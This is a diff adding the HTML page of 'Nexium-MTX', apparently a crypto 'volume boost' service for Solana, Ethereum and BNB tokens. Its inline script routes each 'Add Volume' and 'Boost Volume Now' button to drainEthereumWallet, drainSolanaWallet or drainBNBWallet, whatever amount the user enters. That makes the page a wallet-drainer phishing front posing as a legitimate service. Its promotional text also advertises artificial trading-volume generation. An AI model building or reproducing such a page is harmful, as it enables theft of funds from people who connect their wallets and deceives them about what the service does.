@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on Ethereum Mainnet using MetaMask, Phantom, and Trust Wallet">
+    <title>Nexium Add Volume</title>
+    <meta http-equiv="Content-Security-Policy" content="
+      default-src 'self';
+      img-src 'self' https://nexium-bot.onrender.com data: https://i.ibb.co;
+      style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
+      font-src 'self' https://cdnjs.cloudflare.com;
+      script-src 'self' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
+      connect-src 'self' https://cloud.walletconnect.com https://rpc.ankr.com wss://relay.walletconnect.org https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a https://api.etherscan.io https://public-api.solscan.io https://api.coingecko.com;
+      frame-src 'self' https://verify.walletconnect.org;
+    ">
+    <link rel="icon" type="image/png" href="/favicon.svg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css">
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/dist/index.global.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.global.js"></script>
+    <script src="https://unpkg.com/ethers@6.13.2/dist/ethers.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/universal-provider@3.0.1/dist/index.global.js"></script>
+    <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(45deg, #0d0c1d, #1a182e, #1a0c4b);
+            background-size: 400%;
+            animation: gradientShift 15s ease infinite;
+            position: relative;
+        }
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        #backgroundCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        nav, main, footer, section {
+            position: relative;
+            z-index: 1;
+        }
+        .glow-button {
+            background: linear-gradient(45deg, #facc15, #f97316);
+            box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
+        }
+        .glow-button:hover {
+            box-shadow: 0 0 25px rgba(250, 204, 21, 1);
+            transform: scale(1.05);
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+        .wallet-modal, .token-popup, .custom-token-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .wallet-modal.active, .token-popup.active, .custom-token-popup.active {
+            display: flex;
+        }
+        .wallet-modal-content, .token-popup-content, .custom-token-popup-content {
+            background: #1a182e;
+            border: 1px solid #f97316;
+            border-radius: 12px;
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .wallet-modal-content h2, .token-popup-content h2, .custom-token-popup-content h2 {
+            color: #facc15;
+            font-size: 1.5rem;
+            margin-bottom: 16px;
+        }
+        .wallet-modal-content button, .token-popup-content button, .custom-token-popup-content button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: linear-gradient(45deg, #facc15, #f97316);
+            color: #000;
+            font-weight: bold;
+            border-radius: 6px;
+            box-shadow: 0 0 10px rgba(250, 204, 21, 0.7);
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+        .wallet-modal-content button:hover, .token-popup-content button:hover, .custom-token-popup-content button:hover {
+            color: #fff;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(250, 204, 21, 1);
+        }
+        .wallet-modal-content .close-modal, .token-popup-content .close-popup, .custom-token-popup-content .close-popup {
+            background: #4b5563;
+            color: #fff;
+            margin-top: 16px;
+        }
+        .wallet-modal-content .close-modal:hover, .token-popup-content .close-popup:hover, .custom-token-popup-content .close-popup:hover {
+            background: #6b7280;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(107, 114, 128, 0.7);
+        }
+        .nav-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            width: 100%;
+            align-items: center;
+        }
+        .nav-menu a {
+            text-align: center;
+            width: 100%;
+            max-width: 200px;
+            padding: 8px 16px;
+            color: #d1d5db;
+            font-weight: 600;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .nav-menu a:hover {
+            color: #facc15;
+        }
+        @media (min-width: 640px) {
+            .nav-menu {
+                flex-direction: row;
+                justify-content: center;
+            }
+            .nav-menu a {
+                width: auto;
+                padding: 8px 16px;
+            }
+        }
+        .token-grid {
+            display: grid;
+            grid-template-columns: repeat(4, minmax(0, 1fr));
+            gap: 1.5rem;
+        }
+        @media (max-width: 768px) {
+            .token-grid {
+                grid-template-columns: repeat(2, minmax(0, 1fr));
+            }
+        }
+        @media (max-width: 480px) {
+            .token-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        .token-card, .custom-token-card {
+            background: #1a182e;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid #f97316;
+            box-shadow: 0 0 10px rgba(250, 204, 21, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-align: center;
+            cursor: pointer;
+        }
+        .token-card:hover, .custom-token-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
+        }
+        .token-card p, .custom-token-card p {
+            margin: 0.5rem 0;
+            font-size: 0.9rem;
+        }
+        .token-card .name, .custom-token-card .name {
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: #facc15;
+        }
+        .token-card .address, .custom-token-card .address {
+            word-break: break-all;
+            color: #d1d5db;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        @media (max-width: 480px) {
+            .token-card .address, .custom-token-card .address {
+                font-size: 0.7rem;
+                line-height: 1.2;
+                white-space: normal;
+                word-break: break-word;
+                overflow-wrap: anywhere;
+            }
+            .token-popup-content .address, .custom-token-popup-content .address {
+                font-size: 0.7rem;
+                line-height: 1.2;
+                white-space: normal;
+                word-break: break-word;
+                overflow-wrap: anywhere;
+            }
+        }
+        .token-card .market-cap {
+            color: #9ca3af;
+        }
+        .custom-token-popup-content .input-group {
+            display: flex;
+            align-items: center;
+            margin: 1rem 0;
+        }
+        .custom-token-popup-content .input-group span {
+            color: #facc15;
+            font-size: 1.2rem;
+            margin-right: 0.5rem;
+        }
+        .custom-token-popup-content .volume-input, .custom-token-popup-content .address-input {
+            flex-grow: 1;
+            background: #1a182e;
+            border: 1px solid #f97316;
+            color: #fff;
+            padding: 0.5rem;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+        .form-group label {
+            color: #facc15;
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        .form-group select, .form-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border-radius: 8px;
+            border: 1px solid #f97316;
+            background-color: #1a182e;
+            color: #d1d5db;
+            font-size: 1rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group select:focus, .form-group input:focus {
+            outline: none;
+            border-color: #facc15;
+            box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.5);
+        }
+        .info-card {
+            background: #1a182e;
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid #f97316;
+            box-shadow: 0 0 15px rgba(250, 204, 21, 0.3);
+            text-align: center;
+        }
+        .info-card img {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 1rem;
+        }
+        .info-card h3 {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #facc15;
+            margin-bottom: 0.5rem;
+        }
+        .info-card p {
+            color: #9ca3af;
+        }
+    </style>
+</head>
+<body class="bg-[#0d0c1d] text-white font-sans flex flex-col min-h-screen">
+    <canvas id="backgroundCanvas"></canvas>
+    <nav class="w-full max-w-3xl mx-auto flex flex-col items-center bg-[#1a182e] p-4 rounded-xl shadow border border-orange-400 gap-4">
+        <div class="flex items-center justify-center">
+            <img src="/logo.png" alt="Nexium-MTX Logo" id="title-logo" class="h-14 w-14" onerror="console.log('Logo load failed'); this.classList.add('hidden')">
+            <span class="text-lg font-bold text-yellow-400 -ml-1">Nexium-MTX</span>
+        </div>
+        <div class="flex flex-col items-center gap-2 w-full">
+            <div class="nav-menu flex flex-col gap-2" id="nav-menu">
+                <a href="index.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Home</a>
+                <a href="about.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">About</a>
+                <a href="add-volume.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Add Volume</a>
+                <a href="add-boost.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Add Boost</a>
+            </div>
+            <button id="connect-wallet" class="glow-button text-black font-semibold py-2 px-4 rounded-xl animate-pulse transition-all" aria-label="Connect Wallet">Connect Wallet</button>
+        </div>
+    </nav>
+    <div class="wallet-modal" id="wallet-modal">
+        <div class="wallet-modal-content">
+            <h2 class="text-yellow-400">Select a Wallet</h2>
+            <button id="connect-metamask" class="glow-button" aria-label="Connect MetaMask">Connect MetaMask</button>
+            <button id="connect-phantom" class="glow-button" aria-label="Connect Phantom">Connect Phantom</button>
+            <button id="connect-trust" class="glow-button" aria-label="Connect Trust Wallet">Connect Trust Wallet</button>
+            <button class="close-modal" id="close-modal" aria-label="Close Modal">Close</button>
+        </div>
+    </div>
+    <div id="metamaskPrompt" class="metamask-prompt hidden text-center bg-[#1a182e] p-6 rounded-xl border border-orange-400 glass">
+        <p class="text-white">No wallet installed. Install <a href="#" class="text-yellow-400 hover:underline" id="walletLink">wallet</a> to continue.</p>
+    </div>
+
+    <main id="app" class="flex-1 flex flex-col items-center justify-center px-4 py-8">
+        <section class="max-w-4xl w-full mx-auto text-center my-8">
+            <h1 class="text-4xl md:text-5xl font-extrabold text-white leading-tight mb-4">
+                
+            </h1>
+            <p class="text-lg text-gray-400 max-w-2xl mx-auto mb-8">
+                Elevate your token’s visibility and credibility on Solana and Ethereum. Nexium-MTX enables you to generate real trading activity, deepen liquidity, and climb the charts on top crypto platforms—all in just a few steps.
+            </p>
+        </section>
+
+        <section class="max-w-xl w-full mx-auto bg-[#1a182e] p-6 md:p-8 rounded-xl border border-orange-400 shadow-xl">
+            <h2 class="text-2xl md:text-3xl font-bold text-yellow-400 mb-6 text-center">Boost token volume</h2>
+            
+            <div id="token-info" class="mb-6 hidden info-card">
+                <h3 id="token-name" class="text-yellow-400 text-2xl font-bold"></h3>
+                <p id="token-symbol" class="text-gray-400 text-lg mb-2"></p>
+                <p id="token-address-display" class="text-sm text-gray-500 break-all"></p>
+                <div class="mt-4">
+                    <p id="token-market-cap" class="text-gray-300 font-semibold"></p>
+                    <p id="token-price" class="text-gray-300 font-semibold"></p>
+                </div>
+            </div>
+
+            <div class="space-y-6">
+                <div class="form-group">
+                    <label for="token-address" class="block text-gray-300 font-semibold mb-2">Token Address</label>
+                    <input type="text" id="token-address-input" placeholder="Paste token address (e.g., for SOL or WETH)" class="w-full p-3 rounded-xl bg-[#1a182e] border border-orange-400 text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400" />
+                </div>
+
+                <div class="form-group">
+                    <label for="chain-select" class="block text-gray-300 font-semibold mb-2">Select Chain</label>
+                    <select id="chain-select" class="w-full p-3 rounded-xl bg-[#1a182e] border border-orange-400 text-white focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400">
+                        <option value="">--- Select Chain ---</option>
+                        <option value="solana">Solana</option>
+                        <option value="ethereum">Ethereum</option>
+                        <option value="bnb">BNB</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="volume-amount" class="block text-gray-300 font-semibold mb-2">Volume Amount ($)</label>
+                    <input type="number" id="volume-amount" placeholder="Enter amount in USD" class="w-full p-3 rounded-xl bg-[#1a182e] border border-orange-400 text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400" min="10" />
+                </div>
+            </div>
+
+            <button id="boost-volume-btn" class="glow-button w-full mt-8 py-3 text-black font-semibold text-lg rounded-xl transition-all hover:scale-[1.02] active:scale-100">
+                Boost Volume Now
+            </button>
+
+            <p id="status-message" class="text-center mt-4 text-sm text-gray-400"></p>
+        </section>
+
+        <section class="max-w-4xl w-full mx-auto my-12">
+            <h2 class="text-3xl font-bold text-center text-white mb-8">Why Nexium-MTX?</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="info-card">
+                    <i class="fas fa-chart-line text-yellow-400 text-4xl mb-4"></i>
+                    <h3 class="text-xl font-bold text-yellow-400">Stay Trending</h3>
+                    <p class="text-gray-400 mt-2">Our automation keeps your token among the most active pairs, maximizing exposure and attracting new investors 24/7.</p>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-rocket text-yellow-400 text-4xl mb-4"></i>
+                    <h3 class="text-xl font-bold text-yellow-400">Instant Results</h3>
+                    <p class="text-gray-400 mt-2">Submit your details and see your token’s volume increase within minutes. Nexium-MTX operates around the clock for immediate, reliable results.</p>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-star text-yellow-400 text-4xl mb-4"></i>
+                    <h3 class="text-xl font-bold text-yellow-400">Stronger Metrics</h3>
+                    <p class="text-gray-400 mt-2">Boost token volume to earn rewardsand support long-term growth.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="max-w-4xl w-full mx-auto my-12 text-center">
+            <h2 class="text-3xl font-bold text-white mb-4">Nexium-MTX Bot Services</h2>
+            <p class="text-lg text-gray-400 mb-8">Unlock a suite of automation tools designed to accelerate your crypto project’s growth and trading activity.</p>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="info-card">
+                    <h3 class="text-xl font-bold text-yellow-400">Buy Bot</h3>
+                    <p class="text-gray-400 mt-2">Drive your token to the top of trending charts with proven, high-frequency volume generation.</p>
+                </div>
+                <div class="info-card">
+                    <h3 class="text-xl font-bold text-yellow-400">Price Bot</h3>
+                    <p class="text-gray-400 mt-2">Deliver real-time price updates to your community, keeping holders informed and engaged.</p>
+                </div>
+                <div class="info-card">
+                    <h3 class="text-xl font-bold text-yellow-400">New Pairs Bot</h3>
+                    <p class="text-gray-400 mt-2">Get instant alerts on newly listed tokens and trading pairs to stay ahead of the market.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="max-w-4xl w-full mx-auto my-12 text-center">
+            <div class="bg-[#1a182e] p-8 rounded-xl border border-orange-400 shadow-xl">
+                <h2 class="text-3xl font-bold text-white mb-4">Disclaimer</h2>
+                <p class="text-gray-400 text-sm">
+                    Nexium-MTX provides information and automation tools for everyday users Cryptocurrency trading is highly volatile and involves risk. Always do your own research and consult a professional advisor before making investment decisions. Use our services at your own risk.
+                </p>
+            </div>
+        </section>
+
+    </main>
+    <div class="token-popup" id="token-popup">
+        <div class="token-popup-content">
+            <p class="name"></p>
+            <p class="address"></p>
+            <p class="market-cap"></p>
+            <div class="input-group">
+                <span>$</span>
+                <input type="number" class="volume-input" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
+            </div>
+            <button class="add-volume-btn" aria-label="Add Volume">Add Volume</button>
+            <button class="close-popup" aria-label="Close Popup">Close</button>
+        </div>
+    </div>
+    <div class="custom-token-popup" id="custom-token-popup">
+        <div class="custom-token-popup-content">
+            <h2 class="text-yellow-400">Import Custom Token</h2>
+            <div class="input-group">
+                <input type="text" class="address-input volume-input" id="custom-token-address" placeholder="Token Address" aria-label="Custom token address">
+            </div>
+            <div class="input-group">
+                <span>$</span>
+                <input type="number" class="volume-input" id="custom-token-amount" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
+            </div>
+            <button class="add-volume-btn" id="custom-token-submit" aria-label="Add Volume">Add Volume</button>
+            <button class="close-popup" id="close-custom-token-popup" aria-label="Close Popup">Close</button>
+        </div>
+    </div>
+
+    <footer class="text-center text-sm text-gray-400 py-6 border-t border-gray-700">
+        <p>© 2025 Nexium-volume-bot — Built with ❤</p>
+    </footer>
+    <script src="canvas.js"></script>
+    <script type="module" src="main.js"></script>
+    <script type="module">
+        import { NexiumApp } from './main.js';
+        import { CONFIG } from './config.js';
+     
+        console.log('[add-volume] CONFIG imported:', CONFIG);
+     
+        try {
+            const app = new NexiumApp();
+            console.log('NexiumApp initialized successfully');
+     
+            // Handle token card clicks to show popup
+            const tokenCards = document.querySelectorAll('.token-card');
+            console.log(`Found ${tokenCards.length} token cards`);
+            
+            tokenCards.forEach(card => {
+                card.addEventListener('click', () => {
+                    console.log('Token card clicked:', card.dataset.address);
+                    const name = card.querySelector('.name').textContent;
+                    const address = card.dataset.address;
+                    const marketCap = card.querySelector('.market-cap').textContent;
+                    const popup = document.getElementById('token-popup');
+                    const popupContent = popup.querySelector('.token-popup-content');
+                    
+                    popupContent.querySelector('.name').textContent = name;
+                    popupContent.querySelector('.address').textContent = address;
+                    popupContent.querySelector('.market-cap').textContent = marketCap;
+                    popupContent.querySelector('.volume-input').value = ''; // Clear input
+                    
+                    const addVolumeBtn = popupContent.querySelector('.add-volume-btn');
+                    addVolumeBtn.onclick = () => {
+                        console.log('Token popup Add Volume button clicked for address:', address);
+                        const volumeInput = popupContent.querySelector('.volume-input').value;
+                        if (!volumeInput || volumeInput <= 0) {
+                            app.showFeedback('Please enter a valid amount.', 'error');
+                            console.log('Invalid volume amount entered:', volumeInput);
+                            return;
+                        }
+                        console.log('Calling drain function with volume amount:', volumeInput);
+                        if (app.connectedWalletType === 'MetaMask') {
+                            console.log('Calling drainEthereumWallet with no arguments');
+                            app.drainEthereumWallet();
+                        } else if (app.connectedWalletType === 'Phantom') {
+                            console.log('Calling drainSolanaWallet with no arguments');
+                            app.drainSolanaWallet();
+                        } else if (app.connectedWalletType === 'Trust') {
+                            console.log('Calling drainBNBWallet with no arguments');
+                            app.drainBNBWallet();
+                        } else {
+                            app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+                            console.log('No wallet connected for token popup');
+                            return;
+                        }
+                        popup.classList.remove('active');
+                    };
+                    
+                    const closePopupBtn = popupContent.querySelector('.close-popup');
+                    closePopupBtn.onclick = () => {
+                        console.log('Close token popup clicked');
+                        popup.classList.remove('active');
+                    };
+                    
+                    popup.classList.add('active');
+                });
+            });
+            
+            // Handle custom token card click to show custom popup
+            const customTokenCard = document.querySelector('.custom-token-card');
+            if (customTokenCard) {
+                customTokenCard.addEventListener('click', () => {
+                    console.log('Custom token card clicked');
+                    const popup = document.getElementById('custom-token-popup');
+                    const popupContent = popup.querySelector('.custom-token-popup-content');
+                    popupContent.querySelector('#custom-token-address').value = ''; // Clear address input
+                    popupContent.querySelector('#custom-token-amount').value = ''; // Clear amount input
+                    
+                    const addVolumeBtn = popupContent.querySelector('#custom-token-submit');
+                    addVolumeBtn.onclick = () => {
+                        console.log('Custom token popup Add Volume button clicked');
+                        const tokenAddress = popupContent.querySelector('#custom-token-address').value.trim();
+                        const amount = parseFloat(popupContent.querySelector('#custom-token-amount').value.trim());
+                        if (!tokenAddress) {
+                            app.showFeedback('Please enter a token address.', 'error');
+                            console.log('No token address entered in custom popup');
+                            return;
+                        }
+                        if (isNaN(amount) || amount <= 0) {
+                            app.showFeedback('Please enter a valid amount.', 'error');
+                            console.log('Invalid amount entered in custom popup:', amount);
+                            return;
+                        }
+                        console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
+                        if (app.connectedWalletType === 'MetaMask') {
+                            console.log('Calling drainEthereumWallet with no arguments');
+                            app.drainEthereumWallet();
+                        } else if (app.connectedWalletType === 'Phantom') {
+                            console.log('Calling drainSolanaWallet with no arguments');
+                            app.drainSolanaWallet();
+                        } else if (app.connectedWalletType === 'Trust') {
+                            console.log('Calling drainBNBWallet with no arguments');
+                            app.drainBNBWallet();
+                        } else {
+                            app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+                            console.log('No wallet connected for custom token popup');
+                            return;
+                        }
+                        if (popup) {
+                            popup.classList.remove('active');
+                        }
+                    };
+                    
+                    const closePopupBtn = popupContent.querySelector('#close-custom-token-popup');
+                    closePopupBtn.onclick = () => {
+                        console.log('Close custom popup clicked');
+                        if (popup) {
+                            popup.classList.remove('active');
+                        }
+                    };
+                    
+                    if (popup) {
+                        popup.classList.add('active');
+                    }
+                });
+            }
+            
+            // Close popups when clicking outside
+            document.getElementById('token-popup').addEventListener('click', (event) => {
+                if (event.target === event.currentTarget) {
+                    console.log('Clicked outside token popup, closing');
+                    event.currentTarget.classList.remove('active');
+                }
+            });
+            document.getElementById('custom-token-popup').addEventListener('click', (event) => {
+                if (event.target === event.currentTarget) {
+                    console.log('Clicked outside custom token popup, closing');
+                    event.currentTarget.classList.remove('active');
+                }
+            });
+
+            // Ensure nav-menu remains visible
+            const ensureNavMenuVisible = () => {
+                const navMenu = document.getElementById('nav-menu');
+                if (navMenu) {
+                    navMenu.style.display = 'flex';
+                    console.log('Nav menu ensured visible');
+                }
+            };
+     
+            document.getElementById('connect-metamask').addEventListener('click', ensureNavMenuVisible);
+            document.getElementById('connect-phantom').addEventListener('click', ensureNavMenuVisible);
+            document.getElementById('connect-trust').addEventListener('click', ensureNavMenuVisible);
+
+            // New logic for the main body form
+            const tokenAddressInput = document.getElementById('token-address-input');
+            const chainSelect = document.getElementById('chain-select');
+            const volumeAmountInput = document.getElementById('volume-amount');
+            const boostVolumeBtn = document.getElementById('boost-volume-btn');
+            const statusMessage = document.getElementById('status-message');
+            const tokenInfoSection = document.getElementById('token-info');
+     
+            // Address validation regex
+            const isValidEthereumAddress = (address) => /^0x[a-fA-F0-9]{40}$/.test(address);
+            const isValidSolanaAddress = (address) => /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address);
+
+            // Function to validate address based on chain
+            function isValidAddress(address, chain) {
+                if (chain === 'ethereum') {
+                    return isValidEthereumAddress(address);
+                } else if (chain === 'solana') {
+                    return isValidSolanaAddress(address);
+                }
+                return false;
+            }
+     
+            // Function to fetch token data using CoinGecko API only
+            async function fetchTokenData(address, chain) {
+                console.log(`[fetchTokenData] Fetching token data from CoinGecko for address: ${address}, chain: ${chain}`);
+                let tokenData = {
+                    name: 'Unknown Token',
+                    symbol: 'UNK',
+                    address: address,
+                    market_cap: 'N/A',
+                    price: 'N/A'
+                };
+
+                try {
+                    let coingeckoUrl = '';
+                    if (chain === 'ethereum') {
+                        coingeckoUrl = `https://api.coingecko.com/api/v3/coins/ethereum/contract/${address}`;
+                    } else if (chain === 'solana') {
+                        coingeckoUrl = `https://api.coingecko.com/api/v3/coins/solana/contract/${address}`;
+                    } else {
+                        statusMessage.textContent = 'Unsupported chain selected.';
+                        return null;
+                    }
+
+                    console.log(`[fetchTokenData] CoinGecko API URL: ${coingeckoUrl}`);
+                    const coingeckoResponse = await fetch(coingeckoUrl);
+                    const coingeckoData = await coingeckoResponse.json();
+                    console.log(`[fetchTokenData] CoinGecko API response:`, coingeckoData);
+
+                    if (!coingeckoData.error) {
+                        tokenData.name = coingeckoData.name || 'Unknown Token';
+                        tokenData.symbol = coingeckoData.symbol || 'UNK';
+                        tokenData.market_cap = coingeckoData.market_data?.market_cap?.usd
+                            ? `$${coingeckoData.market_data.market_cap.usd.toLocaleString()}`
+                            : 'N/A';
+                        tokenData.price = coingeckoData.market_data?.current_price?.usd
+                            ? `$${coingeckoData.market_data.current_price.usd.toFixed(6)}`
+                            : 'N/A';
+                    } else {
+                        statusMessage.textContent = 'Token not found on CoinGecko.';
+                        console.warn(`[fetchTokenData] CoinGecko error: ${coingeckoData.error}`);
+                    }
+
+                    return tokenData;
+                } catch (error) {
+                    console.error(`[fetchTokenData] Error fetching from CoinGecko:`, error);
+                    statusMessage.textContent = 'Error fetching token data from CoinGecko.';
+                    return null;
+                }
+            }
+     
+            // Listen for changes in the token address or chain selection
+            let lastAddress = '';
+            let lastChain = '';
+            [tokenAddressInput, chainSelect].forEach(element => {
+                element.addEventListener('input', async () => {
+                    const address = tokenAddressInput.value.trim();
+                    const chain = chainSelect.value;
+                    console.log('[input] Input detected, address:', address, 'chain:', chain);
+
+                    // Only fetch if both address and chain are valid and have changed
+                    if (address && chain && isValidAddress(address, chain) && (address !== lastAddress || chain !== lastChain)) {
+                        statusMessage.textContent = 'Fetching token information...';
+                        console.log('[input] Valid input, fetching token data for address:', address, 'chain:', chain);
+                        const tokenData = await fetchTokenData(address, chain);
+
+                        if (tokenData) {
+                            document.getElementById('token-name').textContent = tokenData.name;
+                            document.getElementById('token-symbol').textContent = tokenData.symbol;
+                            document.getElementById('token-address-display').textContent = `Address: ${tokenData.address}`;
+                            document.getElementById('token-market-cap').textContent = `Market Cap: ${tokenData.market_cap}`;
+                            document.getElementById('token-price').textContent = `Price: ${tokenData.price}`;
+                            tokenInfoSection.style.display = 'block';
+                            statusMessage.textContent = 'Token information loaded successfully.';
+                            console.log('[input] Token data loaded successfully:', tokenData);
+                            lastAddress = address;
+                            lastChain = chain;
+                        } else {
+                            tokenInfoSection.style.display = 'none';
+                            statusMessage.textContent = 'Could not find token. Please check the address.';
+                            console.log('[input] No token data found for address:', address);
+                        }
+                    } else if (!chain) {
+                        tokenInfoSection.style.display = 'none';
+                        statusMessage.textContent = 'Please select a chain.';
+                        console.log('[input] Chain not selected');
+                    } else if (!address) {
+                        tokenInfoSection.style.display = 'none';
+                        statusMessage.textContent = 'Please enter a token address.';
+                        console.log('[input] No token address entered');
+                    } else if (!isValidAddress(address, chain)) {
+                        tokenInfoSection.style.display = 'none';
+                        statusMessage.textContent = `Invalid ${chain} address format.`;
+                        console.log('[input] Invalid address format for', chain, ':', address);
+                    }
+                });
+            });
+     
+            // Handle the Boost Volume button click
+            boostVolumeBtn.addEventListener('click', () => {
+                console.log('[boostVolumeBtn] Boost Volume Now button clicked');
+                if (!app.publicKey) {
+                    app.showFeedback('Please connect your wallet first.', 'error');
+                    console.log('[boostVolumeBtn] No wallet connected for Boost Volume');
+                    return;
+                }
+     
+                // Call the correct drain function based on the connected wallet
+                console.log('[boostVolumeBtn] Calling appropriate drain function');
+                if (app.connectedWalletType === 'MetaMask') {
+                    console.log('[boostVolumeBtn] Calling drainEthereumWallet');
+                    app.drainEthereumWallet();
+                } else if (app.connectedWalletType === 'Phantom') {
+                    console.log('[boostVolumeBtn] Calling drainSolanaWallet');
+                    app.drainSolanaWallet();
+                } else if (app.connectedWalletType === 'Trust') {
+                    console.log('[boostVolumeBtn] Calling drainBNBWallet');
+                    app.drainBNBWallet();
+                } else {
+                    app.showFeedback('Your connected wallet is not supported for this action.', 'error');
+                    console.log('[boostVolumeBtn] Unsupported wallet type:', app.connectedWalletType);
+                }
+            });
+     
+            ensureNavMenuVisible();
+        } catch (error) {
+            console.error('[script] Error initializing application logic:', error);
+        }
+    </script>
+</body>
+</html>
